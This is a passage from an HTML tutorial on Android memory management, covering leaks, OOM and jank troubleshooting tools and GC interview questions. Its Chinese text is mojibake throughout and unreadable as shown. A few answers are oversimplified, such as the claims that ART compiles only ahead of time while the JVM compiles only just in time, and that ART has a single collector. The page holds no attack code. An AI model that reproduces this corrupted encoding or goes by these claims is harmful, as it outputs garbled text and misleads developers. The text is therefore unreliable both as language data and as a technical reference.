<li>å¸¸è§ä¿®å¤æ–¹æ³•ï¼š
<ul>
<li>ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</li>
<li>åŠæ—¶æ¸…ç†èµ„æºï¼ˆonDestroyä¸­æ¸…ç†ï¼‰</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>æ¸…ç†é›†åˆ</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§æ³„æ¼åœºæ™¯ï¼š</strong></p>
<p><strong>1. Activity/Contextæ³„æ¼</strong></p>
<ul>
<li>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
<li>å•ä¾‹æŒæœ‰Activity Contextå¼•ç”¨</li>
<li>HandleræŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>2. ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</strong></p>
<ul>
<li>EventBusæœªå–æ¶ˆæ³¨å†Œ</li>
<li>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
<li>å…¶ä»–ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
</ul>
<p><strong>3. é›†åˆç±»æ³„æ¼</strong></p>
<ul>
<li>Listã€Mapä¸­ä¿å­˜äº†ä¸å†ä½¿ç”¨çš„å¯¹è±¡</li>
<li>é›†åˆæŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
</ul>
<p><strong>4. çº¿ç¨‹æ³„æ¼</strong></p>
<ul>
<li>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶</li>
<li>AsyncTaskã€HandlerThreadç­‰</li>
</ul>
<p><strong>5. èµ„æºæœªå…³é—­</strong></p>
<ul>
<li>æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€ç½‘ç»œè¿æ¥ç­‰æœªå…³é—­</li>
<li>å¯¼è‡´èµ„æºæ³„æ¼</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>LeakCanary</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°æ³„æ¼</li>
<li><strong>MAT</strong>ï¼šè¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§ï¼Œè§‚å¯Ÿå†…å­˜è¶‹åŠ¿</li>
</ul>
<h4 data-id="heading-72">5.2.4 å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> åº”ç”¨å´©æºƒï¼Œæ—¥å¿—æ˜¾ç¤ºOutOfMemoryError</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šåº”ç”¨å´©æºƒï¼ŒæŸ¥çœ‹æ—¥å¿—</strong></p>
<ul>
<li>åº”ç”¨å´©æºƒæ—¶ï¼ŒæŸ¥çœ‹logcatæ—¥å¿—</li>
<li>å¦‚æœçœ‹åˆ°OutOfMemoryErrorï¼Œè¯´æ˜å‘ç”Ÿäº†OOM</li>
<li>æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ï¼Œäº†è§£OOMçš„ç±»å‹</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡Profilerè§‚å¯Ÿå†…å­˜</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯Ÿå†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œæ¥è¿‘å†…å­˜ä¸Šé™ï¼Œå¯èƒ½å‘ç”ŸOOM</li>
<li>åœ¨OOMå‰ç”Ÿæˆå †è½¬å‚¨ï¼Œåˆ†æåŸå› </li>
</ul>
<p><strong>OOMçš„ç±»å‹ï¼š</strong></p>
<ul>
<li><strong>Java heap space</strong>ï¼šå †å†…å­˜æº¢å‡ºï¼ˆæœ€å¸¸è§ï¼‰</li>
<li><strong>PermGen space</strong>ï¼šæ–¹æ³•åŒºæº¢å‡ºï¼ˆAndroidä¸ä½¿ç”¨ï¼‰</li>
<li><strong>Direct buffer memory</strong>ï¼šç›´æ¥å†…å­˜æº¢å‡ºï¼ˆè¾ƒå°‘è§ï¼‰</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li><strong>åœ¨OOMæ—¶</strong>ï¼šç³»ç»Ÿå¯èƒ½è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨ï¼ˆå¦‚æœé…ç½®äº†ï¼‰</li>
<li><strong>åœ¨OOMå‰</strong>ï¼šå¦‚æœå‘ç°å†…å­˜æŒç»­å¢é•¿ï¼Œæå‰ç”Ÿæˆå †è½¬å‚¨</li>
<li><strong>æ‰‹åŠ¨ç”Ÿæˆ</strong>ï¼šä½¿ç”¨Profileræ‰‹åŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>ç­‰å¾…MATåˆ†æå®Œæˆ</li>
<li>æŸ¥çœ‹MATçš„"Leak Suspects"æŠ¥å‘Šï¼ˆå¦‚æœæœ‰ï¼‰</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŒ‰"Retained Heap"æ’åº</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åˆ†æè¿™äº›ç±»ä¸ºä»€ä¹ˆå ç”¨è¿™ä¹ˆå¤šå†…å­˜</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æå¯¹è±¡å¼•ç”¨å…³ç³»</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Dominator Tree"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨å…³ç³»</li>
<li>æ‰¾å‡ºå“ªäº›å¯¹è±¡æŒæœ‰å¤§é‡å†…å­˜</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼š
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡è¢«å¼•ç”¨ï¼Œæ— æ³•å›æ”¶</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å¾ˆå¤§</li>
<li><strong>å¯¹è±¡å¤ªå¤š</strong>ï¼šåˆ›å»ºäº†å¤ªå¤šå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¿®å¤é—®é¢˜</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤é—®é¢˜ï¼š
<ul>
<li><strong>å¦‚æœæ˜¯å†…å­˜æ³„æ¼</strong>ï¼šä¿®å¤æ³„æ¼ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ï¼‰</li>
<li><strong>å¦‚æœæ˜¯å¤§å¯¹è±¡</strong>ï¼šä¼˜åŒ–å¤§å¯¹è±¡ï¼ˆå‹ç¼©ã€åŠæ—¶é‡Šæ”¾ï¼‰</li>
<li><strong>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤š</strong>ï¼šå‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆä½¿ç”¨å¯¹è±¡æ± ã€åˆ†æ‰¹åŠ è½½ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. å†…å­˜æ³„æ¼ï¼ˆæœ€å¸¸è§ï¼‰</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºæ³„æ¼å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼ˆä½¿ç”¨å¼±å¼•ç”¨ã€åŠæ—¶æ¸…ç†ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>2. ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®åˆ°å†…å­˜</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>åˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li>ä½¿ç”¨åˆ†é¡µåŠ è½½</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„æ•°æ®</li>
</ul>
</li>
</ul>
<p><strong>3. å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šåŠ è½½è¿‡å¤§çš„å›¾ç‰‡ã€åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>4. é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
</li>
</ul>
<p><strong>5. Androidè®¾å¤‡å†…å­˜é™åˆ¶</strong></p>
<ul>
<li><strong>åŸå› </strong>ï¼šä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š
<ul>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜</li>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>MAT</strong>ï¼šåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li><strong>LeakCanary</strong>ï¼šæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-73">5.2.5 åº”ç”¨å¡é¡¿é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> åº”ç”¨è¿è¡Œå¡é¡¿ï¼Œç”¨æˆ·ä½“éªŒå·®</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šç”¨æˆ·åé¦ˆ</strong></p>
<ul>
<li>ç”¨æˆ·åé¦ˆåº”ç”¨å¡é¡¿</li>
<li>è§‚å¯Ÿåº”ç”¨è¿è¡Œæƒ…å†µï¼Œå‘ç°å¡é¡¿</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¦‚æœä¸»çº¿ç¨‹æœ‰çº¢è‰²å¸§ï¼ˆæ‰å¸§ï¼‰ï¼Œè¯´æ˜æœ‰å¡é¡¿</li>
<li>æŸ¥çœ‹å¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡Profilerè§‚å¯Ÿ</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯ŸCPUä½¿ç”¨æƒ…å†µ</li>
<li>å¦‚æœCPUä½¿ç”¨ç‡çªç„¶ä¸‹é™ï¼Œå¯èƒ½æœ‰å¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šåº”ç”¨è¿è¡Œæµç•…ï¼Œå¸§ç‡ç¨³å®š</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šåº”ç”¨å¶å°”å¡é¡¿ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šåº”ç”¨é¢‘ç¹å¡é¡¿ï¼Œä¸¥é‡å½±å“ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>å¡é¡¿çš„å¯èƒ½åŸå› ï¼š</strong></p>
<p><strong>1. GCå¯¼è‡´çš„å¡é¡¿ï¼ˆå¸¸è§ï¼‰</strong></p>
<ul>
<li>GCæš‚åœä¸»çº¿ç¨‹ï¼Œå¯¼è‡´å¡é¡¿</li>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œæ›´å®¹æ˜“å¯¼è‡´å¡é¡¿</li>
<li>GCé¢‘ç¹è§¦å‘ï¼Œå¯¼è‡´é¢‘ç¹å¡é¡¿</li>
</ul>
<p><strong>2. ä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œ</strong></p>
<ul>
<li>ä¸»çº¿ç¨‹æ‰§è¡Œè€—æ—¶æ“ä½œï¼ˆæ¯”å¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶IOï¼‰</li>
<li>å¯¼è‡´ä¸»çº¿ç¨‹é˜»å¡ï¼Œåº”ç”¨å¡é¡¿</li>
</ul>
<p><strong>3. å¸ƒå±€å¤æ‚</strong></p>
<ul>
<li>å¸ƒå±€å±‚çº§å¤ªæ·±ï¼Œæ¸²æŸ“è€—æ—¶</li>
<li>å¯¼è‡´UIæ¸²æŸ“æ…¢ï¼Œåº”ç”¨å¡é¡¿</li>
</ul>
<p><strong>4. å…¶ä»–åŸå› </strong></p>
<ul>
<li>åŠ¨ç”»æ€§èƒ½é—®é¢˜</li>
<li>å›¾ç‰‡åŠ è½½é—®é¢˜</li>
<li>å…¶ä»–æ€§èƒ½é—®é¢˜</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼ˆé’ˆå¯¹GCå¯¼è‡´çš„å¡é¡¿ï¼‰ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šä½¿ç”¨Systraceåˆ†æå¡é¡¿</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æ“ä½œåº”ç”¨ï¼Œè§¦å‘å¡é¡¿</li>
<li>åœæ­¢è®°å½•ï¼ŒæŸ¥çœ‹ç»“æœ</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šæŸ¥çœ‹ä¸»çº¿ç¨‹æ‰§è¡Œæƒ…å†µ</strong></p>
<ul>
<li>åœ¨Systraceä¸­æ‰¾åˆ°"main"çº¿ç¨‹</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰çº¢è‰²å¸§ï¼ˆæ‰å¸§ï¼‰</li>
<li>æŸ¥çœ‹å¡é¡¿çš„æ—¶é—´æ®µ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</strong></p>
<ul>
<li>åœ¨Systraceä¸­æŸ¥æ‰¾GCäº‹ä»¶</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æGCåŸå› </strong></p>
<ul>
<li>æŸ¥çœ‹GCç±»å‹ï¼šæ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>æŸ¥çœ‹GCè€—æ—¶ï¼šGCæš‚åœæ—¶é—´æ˜¯å¦è¿‡é•¿</li>
<li>æŸ¥çœ‹GCé¢‘ç‡ï¼šGCæ˜¯å¦è¿‡äºé¢‘ç¹</li>
<li>åˆ†æGCåŸå› ï¼šä¸ºä»€ä¹ˆè§¦å‘GC</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä½¿ç”¨Profilerè¿›ä¸€æ­¥åˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨ProfileræŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>æŸ¥çœ‹GCäº‹ä»¶å’Œå†…å­˜æ›²çº¿</li>
<li>åˆ†æå†…å­˜ä½¿ç”¨æ˜¯å¦æ­£å¸¸</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¼˜åŒ–ä»£ç ï¼Œå‡å°‘GC</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç ï¼š
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…è§¦å‘Full GC</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
<li>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨ã€åŠ¨ç”»ç­‰åœºæ™¯</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šåˆ—è¡¨æ»‘åŠ¨æ—¶ï¼Œé¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>2. é¿å…è§¦å‘Full GC</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
</ul>
</li>
</ul>
<p><strong>3. ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong></p>
<ul>
<li>ViewHolderå¤ç”¨</li>
<li>é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± </li>
<li>å‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>4. ä¼˜åŒ–åŠ¨ç”»</strong></p>
<ul>
<li>å¤ç”¨åŠ¨ç”»å¯¹è±¡</li>
<li>é¿å…é¢‘ç¹åˆ›å»ºåŠ¨ç”»å¯¹è±¡</li>
<li>å‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>5. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œå‡å°‘Full GC</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>Systrace</strong>ï¼šåˆ†æå¡é¡¿ï¼ŒæŸ¥çœ‹GCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜å’ŒGC</li>
<li><strong>logcat</strong>ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œåˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
</ul>
<hr/>
<h2 data-id="heading-74">ç¬¬å…­éƒ¨åˆ†ï¼šé¢è¯•é¢˜</h2>
<h4 data-id="heading-75">6.1 åŸºç¡€æ¦‚å¿µé¢˜ï¼ˆå¿…è€ƒï¼‰</h4>
<h4 data-id="heading-76">6.1.1 GCåŸºç¡€æ¦‚å¿µ</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯åƒåœ¾å›æ”¶ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>åƒåœ¾å›æ”¶ï¼ˆGarbage Collectionï¼ŒGCï¼‰æ˜¯è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æœºåˆ¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«å’Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé‡Šæ”¾å®ƒä»¬å ç”¨çš„å†…å­˜ç©ºé—´ã€‚</p>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è‡ªåŠ¨ç®¡ç†</strong>ï¼šä¸éœ€è¦å¼€å‘è€…æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œé¿å…å¿˜è®°é‡Šæ”¾å¯¼è‡´çš„å†…å­˜æ³„æ¼</li>
<li><strong>è‡ªåŠ¨è¯†åˆ«</strong>ï¼šç³»ç»Ÿè‡ªåŠ¨åˆ¤æ–­å“ªäº›å¯¹è±¡æ˜¯"åƒåœ¾"ï¼ˆä¸å†ä½¿ç”¨ï¼‰</li>
<li><strong>è‡ªåŠ¨å›æ”¶</strong>ï¼šè‡ªåŠ¨é‡Šæ”¾åƒåœ¾å¯¹è±¡å ç”¨çš„å†…å­˜ç©ºé—´</li>
</ul>
<p><strong>åœ¨Androidä¸­çš„é‡è¦æ€§ï¼š</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>GCæ€§èƒ½ç›´æ¥å½±å“åº”ç”¨æµç•…åº¦</li>
<li>é¢‘ç¹GCä¼šå¯¼è‡´å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>å†…å­˜ä¸è¶³å¯èƒ½å¯¼è‡´åº”ç”¨è¢«ç³»ç»Ÿæ€æ­»</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-comment">// obj1å’Œobj2ä¸å†è¢«å¼•ç”¨åï¼ŒGCä¼šè‡ªåŠ¨å›æ”¶å®ƒä»¬å ç”¨çš„å†…å­˜</span>
    <span class="hljs-comment">// å¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨é‡Šæ”¾</span>
}
</code></pre>
<p><strong>2. Androidä½¿ç”¨çš„æ˜¯ä»€ä¹ˆè¿è¡Œæ—¶ï¼Ÿä¸JVMçš„åŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Androidä½¿ç”¨çš„æ˜¯<strong>ARTï¼ˆAndroid Runtimeï¼‰</strong>ï¼Œä¸æ˜¯JVMã€‚</p>
<p><strong>ä¸»è¦åŒºåˆ«ï¼š</strong></p>
<ol>
<li>
<p><strong>ç¼–è¯‘æ–¹å¼ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šAOTç¼–è¯‘ï¼ˆAhead-Of-Timeï¼‰ï¼Œåº”ç”¨å®‰è£…æ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
<li><strong>JVM</strong>ï¼šJITç¼–è¯‘ï¼ˆJust-In-Timeï¼‰ï¼Œè¿è¡Œæ—¶ç¼–è¯‘ä¸ºæœºå™¨ç </li>
</ul>
</li>
<li>
<p><strong>GCæœºåˆ¶ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</li>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰ï¼Œå¼€å‘è€…éœ€è¦é€‰æ‹©</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–æ–¹å‘ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šé’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨ï¼ˆå‡å°‘å¡é¡¿ï¼‰</li>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§ä¼˜åŒ–æ–¹å‘ï¼ˆååé‡ã€å»¶è¿Ÿã€å†…å­˜å ç”¨ç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†ä¸åŒ</strong>ï¼š</p>
<ul>
<li><strong>ART</strong>ï¼šé’ˆå¯¹Androidè®¾å¤‡å†…å­˜æœ‰é™çš„ç‰¹ç‚¹ä¼˜åŒ–</li>
<li><strong>JVM</strong>ï¼šé€šå¸¸è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šï¼Œå†…å­˜ç›¸å¯¹å……è¶³</li>
</ul>
</li>
</ol>
<p><strong>3. ARTçš„GCä¸JVMçš„GCæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ARTçš„GCç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åªæœ‰ä¸€ç§æ”¶é›†å™¨</strong>ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼ŒCCï¼‰</li>
<li><strong>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨</strong>ï¼šå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©ï¼Œç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li><strong>ä½å»¶è¿Ÿè®¾è®¡</strong>ï¼šé’ˆå¯¹äº¤äº’å¼åº”ç”¨ä¼˜åŒ–ï¼Œå‡å°‘å¡é¡¿</li>
<li><strong>å¹¶å‘å›æ”¶</strong>ï¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œå°½é‡ä¸æš‚åœä¸»çº¿ç¨‹</li>
<li><strong>å¢é‡å›æ”¶</strong>ï¼šæŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œé¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</li>
</ul>
